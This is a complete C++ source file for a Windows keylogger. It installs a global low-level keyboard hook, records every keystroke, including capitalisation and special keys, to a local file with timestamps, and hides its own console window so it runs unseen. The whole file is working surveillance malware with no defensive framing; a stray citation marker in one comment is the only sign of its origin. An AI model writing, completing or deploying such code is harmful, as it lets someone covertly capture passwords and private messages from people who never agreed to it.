// hook_keylogger.cpp
#include <windows.h>
#include <fstream>
#include <iostream>
#include <ctime>

#pragma comment(lib, "user32.lib")

HHOOK keyboardHook;
std::ofstream logFile;

std::string GetTimestamp() {
    time_t now = time(0);
    char buffer[80];
    struct tm tstruct;
    localtime_s(&tstruct, &now);
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S]", &tstruct);
    return std::string(buffer);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKeyStruct->vkCode;
            
            // Log key press
            logFile.open("hook_log.txt", std::ios::app);
            
            // Handle different key types
            if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
                // Check keyboard state for shift/caps
                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                
                if (vkCode >= 'A' && vkCode <= 'Z') {
                    if ((shiftPressed && !capsLock) || (!shiftPressed && capsLock)) {
                        logFile << (char)vkCode;
                    } else {
                        logFile << (char)tolower(vkCode);
                    }
                } else {
                    logFile << (char)vkCode;
                }
            } else {
                // Special keys
                switch(vkCode) {
                    case VK_SPACE: logFile << " "; break;
                    case VK_RETURN: logFile << "\n"; break;
                    case VK_TAB: logFile << "[TAB]"; break;
                    case VK_BACK: logFile << "[BACKSPACE]"; break;
                    case VK_ESCAPE: logFile << "[ESC]"; break;
                    case VK_DELETE: logFile << "[DEL]"; break;
                    default:
                        if (vkCode >= VK_F1 && vkCode <= VK_F12) {
                            logFile << "[F" << (vkCode - VK_F1 + 1) << "]";
                        }
                        break;
                }
            }
            
            logFile.close();
        }
    }
    
    // Pass to next hook
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void HideWindow() {
    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}

int main() {
    HideWindow();
    
    // Initial log entry
    logFile.open("hook_log.txt", std::ios::app);
    logFile << "\n=== Keylogger Started " << GetTimestamp() << " ===\n";
    logFile.close();
    
    // Install global keyboard hook [citation:2]
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    if (keyboardHook == NULL) {
        return 1;
    }
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}